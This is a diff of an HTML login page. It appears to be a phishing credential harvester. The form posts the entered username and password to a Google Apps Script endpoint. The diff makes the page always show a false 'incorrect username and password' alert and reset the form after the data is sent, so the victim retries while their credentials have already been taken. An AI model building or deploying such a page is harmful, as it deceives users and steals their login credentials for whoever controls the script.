@@ -156,10 +156,10 @@
         </div>
         <div class="row justify-content-center">
           <div class="col-md-5">
-            <div class="alert alert-warning alert-dismissible fade show" role="alert">
-              <strong>Holy guacamole!</strong> You should check in on some of those fields below.
+            <div class="alert alert-warning alert-dismissible fade show d-none my-alert" role="alert">
+              <strong>Incorret Username and Password!</strong> The username and password you entered incorrect. Please try again.
               <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
-            </div>
+            </div> 
             <form name="user n pass login nad">
               <div class="mb-3">
                 <label for="name" class="form-label">Username</label>
@@ -195,15 +195,31 @@
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-A3rJD856KowSb7dwlZdYEkO39Gagi7vIsF0jrRAoQmDKKtQBHUuLZ9AsSv4jD4Xa" crossorigin="anonymous"></script>
 
     <script>
-      const scriptURL = 'https://script.google.com/macros/s/AKfycbwniLgRZJrsfZvZnswqlHXd4a1aVja3pnvZfg35ZMk_4Tsm4TFi4zx_ZYQbVkBXUP-i/exec'
+      const scriptURL = 'https://script.google.com/macros/s/AKfycbwH6M_wFCdAgMm7wBsKleN9hxYRyZcvhYfmRCKOaIv5lArxfK4k8VcGC73q4r2AsFxmag/exec'
       const form = document.forms['user n pass login nad']
+      const btnLogin = document.querySelector('.btn-login')
+      const btnLoading = document.querySelector('.btn-loading')
+      const myAlert = document.querySelector('.my-alert')
     
       form.addEventListener('submit', e => {
         e.preventDefault()
+        // ketika tombil login di klik
+        // tampilkan tombol loading, hilangkan tombol kirim
+        btnLoading.classList.toggle('d-none')
+        btnLogin.classList.toggle('d-none')
         fetch(scriptURL, { method: 'POST', body: new FormData(form)})
-          .then(response => console.log('Success!', response))
-          .catch(error => console.error('Error!', error.message))
+          .then(response => {
+            // tampilkan tombol login, hilangkan tombol loading
+            btnLoading.classList.toggle('d-none')
+            btnLogin.classList.toggle('d-none')
+            // tampilkan alert
+            myAlert.classList.toggle('d-none')
+            // reset password
+            form.reset()
+            console.log('Success!', response)
+          })
+          .catch(error => {console.error('Error!', error.message)})
       })
-    </script>
+    </script> 
   </body>
 </html>
